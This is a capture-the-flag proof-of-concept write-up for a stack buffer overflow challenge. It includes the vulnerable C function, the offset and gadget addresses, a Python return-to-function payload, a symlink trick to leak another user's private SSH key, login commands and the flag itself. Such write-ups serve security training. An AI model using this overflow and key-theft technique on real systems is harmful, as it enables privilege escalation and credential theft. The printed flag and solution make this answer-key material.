# PoC — Challenge 08: R3t2func

**Flag:** `EPI{5ENI0R_d0E5N7_mEAN_Le55_pr0ne_70_HACK}`
**Vulnerability:** Return-to-function — overwrite return address to call `read_ssh()` on an arbitrary file
**Binary:** `/home/junior-dev/read-pub-ssh` (64-bit, runs as senior-dev via sudo NOPASSWD)
**Access needed:** SSH as `junior-dev`

---

## Vulnerability

`read-pub-ssh` reads and prints a user's SSH public key. The `finish()` function has a stack buffer overflow:

```c
void finish(int fd) {
    char buf[144];
    read(0, buf, 1024);  // reads up to 1024 bytes into 144-byte buffer
    // ...
}
```

`finish()` is called after printing the key. By overflowing `buf[144]`, we overwrite the return address to call `read_ssh()` (the function that prints keys) with an arbitrary file path instead.

**read_ssh() @ 0x401176** — prints the file pointed to by the symlink `~/.ssh/id_rsa.pub`  
**ret gadget @ 0x401016** — `ret` (for 16-byte stack alignment before read_ssh)

**Offset to return address:** 144 (buf) + 8 (saved RBP) = **152 bytes**

**Strategy:**
1. Symlink `~/.ssh/id_rsa.pub` → `/home/junior-dev/.ssh/senior_ssh` (senior-dev's private key)
2. Overflow return address → `read_ssh()` reads the symlink target → leaks the private key
3. Use the leaked Ed25519 key to SSH as `senior-dev` and read the flag

---

## Critical: PTY Raw Mode

The exploit is run via `sudo -u senior-dev /home/junior-dev/read-pub-ssh`, which requires a PTY.  
The exploit addresses contain bytes `\x11` (XON) and `\x16` (VLNEXT) that the PTY line discipline would silently consume.  
**Solution:** set the PTY slave to raw mode with `tty.setraw(slave)` before spawning the process.

---

## Exploit

```bash
# Run the automated exploit:
python3 challenges/08_r3t2func/scripts/exploit_r3t2func2.py <SSH_PORT>
```

**What the script does:**
1. SSH as `junior-dev`
2. Creates symlink: `~/.ssh/id_rsa.pub` → `/home/junior-dev/.ssh/senior_ssh`
3. Spawns `sudo -u senior-dev read-pub-ssh` in a PTY (raw mode)
4. Sends overflow payload → return address → `read_ssh()` prints the senior-dev private key
5. Restores `id_rsa.pub` to original

**Payload:**
```python
import struct
OFFSET = 152
RET_GAD  = 0x401016  # ret (stack alignment)
READ_SSH = 0x401176  # read_ssh()

payload = b"A" * OFFSET + struct.pack("<Q", RET_GAD) + struct.pack("<Q", READ_SSH) + b"\n"
```

**After recovering the key:**
```bash
# Save the leaked key to /tmp/senior_dev_key
chmod 600 /tmp/senior_dev_key
ssh -i /tmp/senior_dev_key senior-dev@ecorp.cyber.epitest.eu -p <PORT>
cat ~/todo.txt   # contains the flag
```

**Flag:** `EPI{5ENI0R_d0E5N7_mEAN_Le55_pr0ne_70_HACK}`
